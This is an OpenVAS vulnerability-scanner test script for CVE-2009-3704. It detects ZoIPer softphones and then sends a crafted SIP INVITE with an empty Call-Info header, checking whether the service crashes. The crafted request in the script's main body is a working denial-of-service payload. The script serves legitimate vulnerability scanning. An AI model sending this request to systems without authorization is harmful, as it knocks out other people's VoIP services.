###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zoiper_empty_callinfo_dos_vuln.nasl 10974 2018-08-15 09:55:34Z cfischer $
#
# ZoIPer Empty Call-Info Denial of Service Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800963");
  script_version("$Revision: 10974 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-15 11:55:34 +0200 (Wed, 15 Aug 2018) $");
  script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-3704");
  script_name("ZoIPer Empty Call-Info Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("sip_detection.nasl", "find_service.nasl");
  script_mandatory_keys("sip/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/37015");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53792");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/0910-exploits/zoiper_dos.py.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the service to crash.

  Impact Level: Application");

  script_tag(name:"affected", value:"ZoIPer version prior to 2.24 (Windows) and 2.13 (Linux)");

  script_tag(name:"insight", value:"The flaw is due to an error while handling specially crafted SIP INVITE
  messages which contain an empty Call-Info header.");

  script_tag(name:"solution", value:"Upgrade to ZoIPer version 2.24 (Windows) and 2.13 (Linux) or later,
  http://www.zoiper.com/zoiper.php");

  script_tag(name:"summary", value:"This host is running ZoIPer and is prone to Denial of Service
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("sip.inc");
include("misc_func.inc");

infos = get_sip_port_proto( default_port:"5060", default_proto:"udp" );
port = infos['port'];
proto = infos['proto'];

banner = get_sip_banner( port:port, proto:proto );
if( "Zoiper" >!< banner ) exit( 0 );

if( ! sip_alive( port:port, proto:proto ) ) exit( 0 );

from_default = get_vt_string();
from_lower   = get_vt_string( lowercase:TRUE );

req = string(
  "INVITE sip:", from_lower, "@", get_host_name(), " SIP/2.0","\r\n",
  "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, ";branch=z9hG4bKJRnTggvMGl-6233","\r\n",
  "Max-Forwards: 70","\r\n",
  "From: ", from_default, " <sip:", from_lower, "@", this_host(),">;tag=f7mXZqgqZy-6233","\r\n",
  "To: ", from_default, " <sip:", from_lower, "@", get_host_name(), ":", port, ">","\r\n",
  "Call-ID: ", rand(),"\r\n",
  "CSeq: 6233 INVITE","\r\n",
  "Contact: ", from_default, " <sip:", from_lower, "@", get_host_name(),">","\r\n",
  "Content-Type: application/sdp","\r\n",
  "Call-Info:","\r\n",
  "Content-Length: 125","\r\n\r\n");
sip_send_recv( port:port, data:req, proto:proto );

if( ! sip_alive( port:port, proto:proto ) ) {
  security_message( port:port, proto:proto );
  exit( 0 );
}

exit( 99 );